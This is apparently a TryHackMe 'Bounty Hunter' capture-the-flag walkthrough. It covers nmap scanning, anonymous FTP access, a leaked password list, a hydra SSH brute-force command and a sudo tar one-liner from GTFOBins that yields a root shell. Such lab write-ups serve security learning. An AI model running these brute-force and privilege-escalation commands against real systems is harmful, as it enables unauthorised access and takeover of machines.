# Bounty Hunter

Platform - TryHackMe
Level    - Easy

## Description

You talked a big game about being the most elite hacker in the solar system. Prove it and claim your right to the status of Elite Bounty Hacker!

## Solution/Walkthrough

Deploy the Machine, ping the displayed IP address to ensure connectivity. 

Start reconnaissance using ```nmap```;
```
sudo nmap -sV -sC <IP Address> -v
```
Results:
```
PORT      STATE  SERVICE         VERSION
20/tcp    closed ftp-data
21/tcp    open   ftp             vsftpd 3.0.5
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.148.79
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.5 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: PASV failed: 550 Permission denied.
22/tcp    open   ssh             OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 59:85:90:84:6b:20:95:cb:ff:e7:ea:59:8f:95:a5:a1 (RSA)
|   256 6b:5c:6b:67:ab:2b:f7:26:c2:13:78:67:e9:82:29:c8 (ECDSA)
|_  256 99:5c:36:1c:77:7c:47:df:15:4f:fa:02:de:06:cd:66 (ED25519)
80/tcp    open   http            Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.41 (Ubuntu)
```
FTP port is open with FTP version 3.0.5, ssh port is open indicating remote access and web-application hosted is hosted http port 80.

Access the ftp service using the ```ftp``` command and using "anonymous" as the username
```
ftp <IP Address>
```
After gaining access, use ```ls``` to list contents of the ftp directory, Result of ```ls```
```
550 Permission denied.
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-rw-r--    1 ftp      ftp           418 Jun 07  2020 locks.txt
-rw-rw-r--    1 ftp      ftp            68 Jun 07  2020 task.txt
226 Directory send OK.
```

Use ```get``` command to download the files;

```
get <file-name>
```
The website hosted on port 80, contains an image from the anime "Cowboy Bebop", with text written as dialouge from each characters

The two files downloaded from FTP contains information on the user and different passwords combination;
Content of task.txt
```
1.) Protect Vicious.
2.) Plan for Red Eye pickup on the moon.

-lin
```
content of locks.txt
```
rEddrAGON
ReDdr4g0nSynd!cat3
Dr@gOn$yn9icat3
R3DDr46ONSYndIC@Te
ReddRA60N
R3dDrag0nSynd1c4te
dRa6oN5YNDiCATE
ReDDR4g0n5ynDIc4te
R3Dr4gOn2044
RedDr4gonSynd1cat3
R3dDRaG0Nsynd1c@T3
Synd1c4teDr@g0n
reddRAg0N
REddRaG0N5yNdIc47e
Dra6oN$yndIC@t3
4L1mi6H71StHeB357
rEDdragOn$ynd1c473
DrAgoN5ynD1cATE
ReDdrag0n$ynd1cate
Dr@gOn$yND1C4Te
RedDr@gonSyn9ic47e
REd$yNdIc47e
dr@goN5YNd1c@73
rEDdrAGOnSyNDiCat3
r3ddr@g0N
ReDSynd1ca7e
```

From the above files it is clear that the username is "lin" and one of the word listed in the file is the password. 

Use ```hydra``` to find the password of the user "lin" to gain ssh access to the machine
```
hydra -l lin -P locks.txt <IP Address> ssh
```

Using the password found, log into the machine via SSH
```
ssh lin@<IP Address>
```
Use ```ls``` to list the files in the current working directory and to view the user.txt file use the ```cat``` command.

To gain privilege escalation, use the command ```sudo -l``` to list user's privileges or check a specific command; the result is
```
Matching Defaults entries for lin on ip-10-114-149-54:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User lin may run the following commands on ip-10-114-149-54:
    (root) /bin/tar
```
Therefore ```tar``` can be used to gain root privilege, Visit gtfobins.org and search "tar". Under shell in the sudo tab, a command is listed which executed using sudo would provide root shell;
```
sudo tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```
Thus, gaining the root access. Use the current privileges to view the root.txt file in the /root directory.

File read method descirbed in gtfobins can also be used for viewing the contents of the root.txt file.
